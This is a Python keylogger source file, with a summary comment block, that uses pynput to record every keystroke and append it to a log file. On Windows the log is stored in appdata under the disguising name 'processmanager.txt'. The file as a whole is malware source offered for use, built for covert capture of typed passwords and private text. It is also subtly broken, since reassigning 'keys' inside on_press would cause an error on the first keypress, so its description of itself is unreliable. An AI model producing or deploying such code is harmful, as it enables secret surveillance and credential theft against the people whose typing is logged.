##########
#Summary:
#This Python program is a simple keylogger that listens for keyboard events and logs the keys pressed by the user. The `pynput` library is used to capture the keystrokes. The captured keystrokes are then saved to a file, either in the Windows `appdata` folder or in the current working directory for Linux-based systems. Special keys such as backspace, space, enter, shift, and caps lock are handled and written as human-readable representations. The program will keep running indefinitely until manually stopped.

#Key Features:
#- Uses `pynput.keyboard.Listener` to listen for keypress events.
#- Logs both regular keys and special keys like 'backspace', 'space', 'shift', etc.
#- Handles platform-specific file saving locations (Windows vs Linux).
#- Captures keystrokes in real-time and writes them to a log file.
#- Handles file access errors gracefully.

#Important Functions:
#- `on_press`: Handles each key press event and writes the captured keystrokes to a file.
#- `write_file`: Writes the captured keys to the specified file and handles special key cases.
############

import os
from pynput.keyboard import Listener, Key

# List to store the pressed keys
keys = []

# Platform-specific path handling
# Check if the operating system is Windows or not to decide where to save the file
if os.name == 'nt':  # Windows system
    path = os.environ['appdata'] + '\\processmanager.txt'  # Save in the appdata folder on Windows
else:  # For Linux or other systems
    path = 'processmanager.txt'  # Save in the current working directory on Linux

def on_press(key):
    """
    Function that is called when a key is pressed.
    This function appends the pressed key to the 'keys' list and writes the captured keys to the file.
    After writing the keys, the list is reset.
    """
    keys.append(key)  # Add the pressed key to the list
    write_file(keys)  # Write the captured keys to the file
    keys = []  # Reset the list after writing to avoid repeated writing of the same keys

def write_file(keys):
    """
    Writes the captured keys to a file. The function handles special keys like backspace, space, enter,
    shift, and caps lock, and writes corresponding human-readable representations to the file.
    Regular characters are written directly as they are.
    """
    try:
        with open(path, 'a') as f:  # Open the file in append mode
            for key in keys:  # Loop through each captured key
                try:
                    k = key.char  # Try to get the character for regular keys (letters, numbers)
                except AttributeError:
                    # If it's a special key, handle them separately
                    if key == Key.space:  # If the key is 'space'
                        k = 'Space'
                    elif key == Key.enter:  # If the key is 'enter'
                        k = '\n'  # Insert a newline for the 'enter' key
                    elif key == Key.shift:  # If the key is 'shift'
                        k = 'Shift'
                    elif key == Key.backspace:  # If the key is 'backspace'
                        k = 'Backspace'
                    elif key == Key.caps_lock:  # If the key is 'caps_lock'
                        k = 'Caps Lock'
                    else:
                        k = str(key)  # For any other special key, convert to string

                f.write(k)  # Write the key (character or special key representation) to the file
    except Exception as e:
        # In case of any errors while writing to the file, print the error
        print(f"Error writing to file: {e}")

# Start the key press listener
with Listener(on_press=on_press) as listener:
    listener.join()  # Keep the listener running until manually stopped
